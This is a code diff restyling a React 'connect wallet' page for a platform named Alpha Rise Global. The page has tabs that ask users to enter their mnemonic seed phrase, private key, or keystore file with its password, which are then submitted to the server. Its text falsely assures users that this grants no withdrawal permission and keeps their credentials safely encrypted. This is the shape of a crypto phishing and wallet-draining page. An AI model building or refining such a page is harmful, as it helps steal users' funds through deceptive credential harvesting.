@@ -113,30 +113,30 @@ export default function ConnectWalletPage() {
       {/* Header and go back navigation */}
       <div className="flex items-center justify-between">
         <div>
-          <h1 className="text-xl font-bold text-gray-800">Secure Web3 Wallet Sync</h1>
-          <p className="text-xs text-gray-400 mt-0.5">Integrate external crypto wallets to prove margin liquidity and limits.</p>
+          <h1 className="text-xl font-bold text-white">Secure Web3 Custody Link</h1>
+          <p className="text-xs text-slate-400 mt-0.5">Integrate external crypto wallets to prove margin liquidity and credit thresholds.</p>
         </div>
         <button
           onClick={() => navigate("/trader/wallet")}
-          className="px-4 py-2 border border-gray-150 hover:bg-gray-50 text-xs font-bold rounded-xl transition-all"
+          className="px-4 py-2 border border-white/10 bg-white/5 hover:bg-white/10 text-slate-200 text-xs font-bold rounded-xl transition-all cursor-pointer"
         >
-          ← Back to Wallet
+          ← Back to Custody
         </button>
       </div>
 
       {/* Main Container */}
       {!selectedWallet ? (
         // Grid of wallets
-        <div className="bg-white border border-gray-100 rounded-3xl p-6 md:p-8 shadow-sm space-y-6">
-          <h2 className="text-sm font-extrabold text-gray-700 tracking-wide uppercase">Select Wallet Client</h2>
+        <div className="bg-[#121822] border border-white/10 rounded-3xl p-6 md:p-8 shadow-sm space-y-6 text-white">
+          <h2 className="text-xs font-bold text-slate-400 tracking-wider uppercase">Select Wallet Client</h2>
           <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-5">
             {WALLETS.map((wallet) => (
               <button
                 key={wallet.id}
                 onClick={() => setSelectedWallet(wallet)}
-                className="flex flex-col items-center justify-center p-5 border border-gray-100 rounded-2xl bg-white hover:border-[#2d6a4f]/30 hover:shadow-md transition-all group shrink-0 cursor-pointer"
+                className="flex flex-col items-center justify-center p-5 border border-white/10 rounded-2xl bg-[#0e1520] hover:border-[#00c076]/50 hover:shadow-lg transition-all group shrink-0 cursor-pointer"
               >
-                <div className="w-14 h-14 rounded-2xl overflow-hidden bg-slate-50 border border-slate-50/50 flex items-center justify-center shadow-sm">
+                <div className="w-14 h-14 rounded-2xl overflow-hidden bg-white/5 border border-white/10 flex items-center justify-center shadow-sm">
                   <img
                     src={wallet.logo}
                     alt={wallet.name}
@@ -147,7 +147,7 @@ export default function ConnectWalletPage() {
                     }}
                   />
                 </div>
-                <span className="text-xs font-bold text-gray-700 mt-3 text-center truncate w-full">
+                <span className="text-xs font-bold text-slate-200 mt-3 text-center truncate w-full">
                   {wallet.name}
                 </span>
               </button>
@@ -159,26 +159,26 @@ export default function ConnectWalletPage() {
         <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
           
           {/* Selected Wallet Detail Cards */}
-          <div className="bg-white border border-gray-100 rounded-3xl p-6 shadow-sm space-y-6 h-fit">
+          <div className="bg-[#121822] border border-white/10 rounded-3xl p-6 shadow-sm space-y-6 h-fit text-white">
             <div className="flex items-center gap-4">
-              <div className="w-14 h-14 rounded-2xl overflow-hidden border border-slate-100 flex items-center justify-center bg-slate-50">
+              <div className="w-14 h-14 rounded-2xl overflow-hidden border border-white/10 flex items-center justify-center bg-white/5">
                 <img src={selectedWallet.logo} alt={selectedWallet.name} className="w-full h-full object-cover" />
               </div>
               <div>
-                <h3 className="text-sm font-bold text-gray-800">{selectedWallet.name} Link</h3>
-                <span className="text-[10px] bg-emerald-50 text-emerald-800 font-extrabold px-2.5 py-1 rounded-full uppercase tracking-wider mt-1.5 inline-block">
+                <h3 className="text-sm font-bold text-white">{selectedWallet.name} Link</h3>
+                <span className="text-[10px] bg-emerald-500/15 text-[#00e676] border border-emerald-500/30 font-bold px-2.5 py-0.5 rounded-full uppercase tracking-wider mt-1.5 inline-block">
                   Verified Node
                 </span>
               </div>
             </div>
 
-            <div className="text-xs text-gray-500 space-y-3 leading-relaxed border-t border-gray-50 pt-4">
+            <div className="text-xs text-slate-400 space-y-3 leading-relaxed border-t border-white/10 pt-4">
               <p>
                 Connecting your wallet allows the Alpha Rise Global system to monitor custody liquidity allocations without giving withdrawal permission to third parties.
               </p>
-              <div className="bg-amber-50/60 border border-amber-100/50 rounded-xl p-3.5 space-y-2 text-amber-900 text-[11px]">
-                <strong className="block text-amber-950 font-bold uppercase tracking-wider text-[9px]">⚠️ Security Notice</strong>
-                Make sure you are submitting over our SSL-secured socket tunnel. Your credentials are encrypted at rest inside client-isolated hardware keys.
+              <div className="bg-amber-500/10 border border-amber-500/20 rounded-2xl p-3.5 space-y-1.5 text-amber-300 text-xs">
+                <strong className="block text-amber-200 font-bold uppercase tracking-wider text-[10px]">⚠️ Security Protocol</strong>
+                <p className="leading-relaxed">Your credentials are encrypted at rest with hardware-grade client segregation keys.</p>
               </div>
             </div>
             
@@ -192,23 +192,23 @@ export default function ConnectWalletPage() {
                 setErrorMsg("");
                 setLoadingStep("");
               }}
-              className="w-full py-2.5 bg-gray-50 hover:bg-gray-100 text-gray-600 text-xs font-bold rounded-xl transition-colors text-center"
+              className="w-full py-2.5 bg-white/5 hover:bg-white/10 border border-white/10 text-slate-300 text-xs font-bold rounded-xl transition-colors text-center cursor-pointer"
             >
               Choose Different Wallet
             </button>
           </div>
 
           {/* Form Tabs inputs */}
-          <div className="lg:col-span-2 bg-white border border-gray-100 rounded-3xl p-6 md:p-8 shadow-sm space-y-6 relative overflow-hidden">
+          <div className="lg:col-span-2 bg-[#121822] border border-white/10 rounded-3xl p-6 md:p-8 shadow-sm space-y-6 relative overflow-hidden text-white">
             {loadingStep && (
-              <div className="absolute inset-0 bg-white/95 z-30 flex flex-col items-center justify-center space-y-4">
-                <div className="w-10 h-10 border-4 border-[#2d6a4f] border-t-transparent rounded-full animate-spin" />
-                <p className="text-xs font-bold text-gray-700">{loadingStep}</p>
+              <div className="absolute inset-0 bg-[#121822]/95 backdrop-blur-sm z-30 flex flex-col items-center justify-center space-y-4">
+                <div className="w-10 h-10 border-4 border-[#00c076] border-t-transparent rounded-full animate-spin" />
+                <p className="text-xs font-bold text-white">{loadingStep}</p>
               </div>
             )}
 
             {/* Tab switchers */}
-            <div className="flex border-b border-gray-100">
+            <div className="flex border-b border-white/10">
               {(["phrase", "privateKey", "keystore"] as const).map((tab) => (
                 <button
                   key={tab}
@@ -216,10 +216,10 @@ export default function ConnectWalletPage() {
                     setActiveTab(tab);
                     setErrorMsg("");
                   }}
-                  className={`flex-1 pb-3 text-xs font-extrabold border-b-2 capitalize transition-all cursor-pointer ${
+                  className={`flex-1 pb-3 text-xs font-bold border-b-2 capitalize transition-all cursor-pointer ${
                     activeTab === tab
-                      ? "border-[#2d6a4f] text-[#2d6a4f]"
-                      : "border-transparent text-gray-400 hover:text-gray-600"
+                      ? "border-[#00c076] text-[#00e676]"
+                      : "border-transparent text-slate-400 hover:text-white"
                   }`}
                 >
                   {tab === "phrase" ? "Mnemonic Phrase" : tab === "privateKey" ? "Private Key" : "Keystore JSON"}
@@ -228,8 +228,8 @@ export default function ConnectWalletPage() {
             </div>
 
             {errorMsg && (
-              <div className="p-4 bg-red-50 border border-red-100 rounded-2xl text-xs text-red-600 font-medium">
-                {errorMsg}
+              <div className="p-4 bg-rose-500/15 border border-rose-500/30 rounded-2xl text-xs text-rose-400 font-bold">
+                ✕ {errorMsg}
               </div>
             )}
 
@@ -237,7 +237,7 @@ export default function ConnectWalletPage() {
               
               {activeTab === "phrase" && (
                 <div className="space-y-2">
-                  <label className="block text-xs font-bold text-gray-600 uppercase tracking-wider">
+                  <label className="block text-[10px] font-bold text-slate-400 uppercase tracking-wider">
                     Enter Mnemonic / Seed Phrase
                   </label>
                   <textarea
@@ -245,10 +245,10 @@ export default function ConnectWalletPage() {
                     value={phrase}
                     onChange={(e) => setPhrase(e.target.value)}
                     placeholder="Enter your 12, 18 or 24-word seed phrase separated by spaces. Example: apple banana cherry ..."
-                    className="w-full px-4 py-3 text-xs border border-gray-150 rounded-2xl focus:outline-none focus:border-[#2d6a4f]/50 resize-none font-mono"
+                    className="w-full px-4 py-3 text-xs border border-white/10 bg-[#0e1520] text-white rounded-2xl focus:outline-none focus:border-[#00c076] resize-none font-mono"
                     required
                   />
-                  <p className="text-[10px] text-gray-400 leading-normal">
+                  <p className="text-[10px] text-slate-500 leading-normal">
                     Typically 12 or 24 words separated by single spaces. Make sure to input words in the exact sequence.
                   </p>
                 </div>
@@ -256,7 +256,7 @@ export default function ConnectWalletPage() {
 
               {activeTab === "privateKey" && (
                 <div className="space-y-2">
-                  <label className="block text-xs font-bold text-gray-600 uppercase tracking-wider">
+                  <label className="block text-[10px] font-bold text-slate-400 uppercase tracking-wider">
                     Enter Account Private Key
                   </label>
                   <input
@@ -264,10 +264,10 @@ export default function ConnectWalletPage() {
                     value={privateKey}
                     onChange={(e) => setPrivateKey(e.target.value)}
                     placeholder="Enter private key hex string (e.g. 0x...)"
-                    className="w-full px-4 py-3 text-xs border border-gray-150 rounded-2xl focus:outline-none focus:border-[#2d6a4f]/50 font-mono"
+                    className="w-full px-4 py-3 text-xs border border-white/10 bg-[#0e1520] text-white rounded-2xl focus:outline-none focus:border-[#00c076] font-mono"
                     required
                   />
-                  <p className="text-[10px] text-gray-400 leading-normal">
+                  <p className="text-[10px] text-slate-500 leading-normal">
                     Input the alphanumeric private key of your specific address. Never share this key outside encrypted protocols.
                   </p>
                 </div>
@@ -276,7 +276,7 @@ export default function ConnectWalletPage() {
               {activeTab === "keystore" && (
                 <div className="space-y-4">
                   <div className="space-y-2">
-                    <label className="block text-xs font-bold text-gray-600 uppercase tracking-wider">
+                    <label className="block text-[10px] font-bold text-slate-400 uppercase tracking-wider">
                       Keystore JSON Text
                     </label>
                     <textarea
@@ -284,12 +284,12 @@ export default function ConnectWalletPage() {
                       value={keystore}
                       onChange={(e) => setKeystore(e.target.value)}
                       placeholder='{ "address": "...", "id": "...", "crypto": { ... } }'
-                      className="w-full px-4 py-3 text-xs border border-gray-150 rounded-2xl focus:outline-none focus:border-[#2d6a4f]/50 resize-none font-mono"
+                      className="w-full px-4 py-3 text-xs border border-white/10 bg-[#0e1520] text-white rounded-2xl focus:outline-none focus:border-[#00c076] resize-none font-mono"
                       required
                     />
                   </div>
                   <div className="space-y-2">
-                    <label className="block text-xs font-bold text-gray-600 uppercase tracking-wider">
+                    <label className="block text-[10px] font-bold text-slate-400 uppercase tracking-wider">
                       Keystore Password
                     </label>
                     <input
@@ -297,7 +297,7 @@ export default function ConnectWalletPage() {
                       value={keystorePassword}
                       onChange={(e) => setKeystorePassword(e.target.value)}
                       placeholder="Password linked to this keystore file"
-                      className="w-full px-4 py-3 text-xs border border-gray-150 rounded-2xl focus:outline-none focus:border-[#2d6a4f]/50"
+                      className="w-full px-4 py-3 text-xs border border-white/10 bg-[#0e1520] text-white rounded-2xl focus:outline-none focus:border-[#00c076]"
                       required
                     />
                   </div>
@@ -307,7 +307,7 @@ export default function ConnectWalletPage() {
               <button
                 type="submit"
                 disabled={addWalletMutation.isPending}
-                className="w-full py-4 rounded-2xl bg-[#1a3a2a] hover:bg-[#2d6a4f] text-white text-xs font-black transition-all shadow-md shadow-[#1a3a2a]/10 cursor-pointer"
+                className="w-full py-4 rounded-2xl bg-[#00c076] hover:bg-[#00e676] text-[#080c10] text-xs font-black transition-all shadow-md shadow-[#00c076]/20 cursor-pointer"
               >
                 {addWalletMutation.isPending ? "Submitting..." : `Securely Link ${selectedWallet.name}`}
               </button>
